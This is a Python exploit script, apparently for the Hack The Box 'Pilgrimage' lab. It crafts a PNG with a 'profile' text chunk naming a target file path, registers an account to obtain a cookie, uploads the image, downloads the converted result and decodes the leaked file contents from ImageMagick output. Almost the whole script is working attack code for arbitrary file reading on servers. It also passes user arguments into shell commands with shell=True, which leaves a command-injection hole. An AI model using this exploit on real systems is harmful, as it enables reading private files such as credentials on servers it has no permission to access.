import requests
import sys
import re


# Use subprocess instead of os.system for better control and security
import subprocess

# Check the number of arguments
if len(sys.argv) < 3:
    print("Usage: python script.py Image_name File_Path")
    sys.exit(1)

# Access the first command-line argument
path = sys.argv[2]
image=sys.argv[1]


# Run pngcrush
pngcrush_command = f'pngcrush -text a "profile" {path} {image}'
pngcrush_process = subprocess.run(pngcrush_command, shell=True, capture_output=True)
pngcrush_output = pngcrush_process.stdout.decode('utf-8')

# Run convert (assuming you want to convert pngout.png to gopro.png)
convert_command = 'convert pngout.png gopro.png'
convert_process = subprocess.run(convert_command, shell=True, capture_output=True)
convert_output = convert_process.stdout.decode('utf-8')


# Use the argument as needed
print("Argument 1:", path)

print('sigining up for cookies')


headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = {
    'username': 'a',
    'password': 'a',
}

response = requests.post('http://pilgrimage.htb/register.php', headers=headers, data=data,allow_redirects=False)

print("got the cookies "+response.headers['Set-Cookie'],'response')

cookie = response.headers.get('Set-Cookie')


# Set the URL and other request parameters
url = 'http://pilgrimage.htb/'
headers = {
    'Host': 'pilgrimage.htb',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://pilgrimage.htb/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
}

# Set the form fields and files
files = {
    'toConvert': ('gopro.png', open('gopro.png', 'rb'), 'image/png'),
}
# Make the POST request
headers['Cookie'] = cookie
print("file uploading")
response = requests.post(url, headers=headers,files=files,allow_redirects=False)
if response.ok:
    location=response.headers.get('Location')
    if location:
        print(location)
        print("file uploaded")
        url_pattern = re.compile(r'http://[^\s"]+')
        # Find the URL in the string
        match1 = url_pattern.search(location)
        # Check if a match1 is found
        if match1:
            url = match1.group()
            wgetUrl=url.split('&')[0]
            fileName=wgetUrl.split('/')[-1]
            print(f"saved filename : {fileName} now downloading file")
            # Run pngcrush
            wgetCmd = f'wget {wgetUrl}'
            print(wgetCmd)
            wget_process = subprocess.run(wgetCmd, shell=True, capture_output=True)
            wget_output = wget_process.stdout.decode('utf-8')
            print(wget_output)

            # Run identify
            identify_command = f'identify -verbose {fileName}'
            identify_process = subprocess.run(identify_command, shell=True, capture_output=True)
            identify_output = identify_process.stdout.decode('utf-8')
            # print(identify_output.split())
            opList=identify_output.split()
            startIndex=opList.index('Raw')+4
            endIndex=opList.index('signature:')
            print(bytes.fromhex("".join(opList[startIndex:endIndex])).decode('utf-8'))
        else:
            print("No URL found in the string.")

    else:
        print("Location Header not present in the response.")
else:
    print(f"Request failed with status code: {response.status_code}")
    print(response.text)
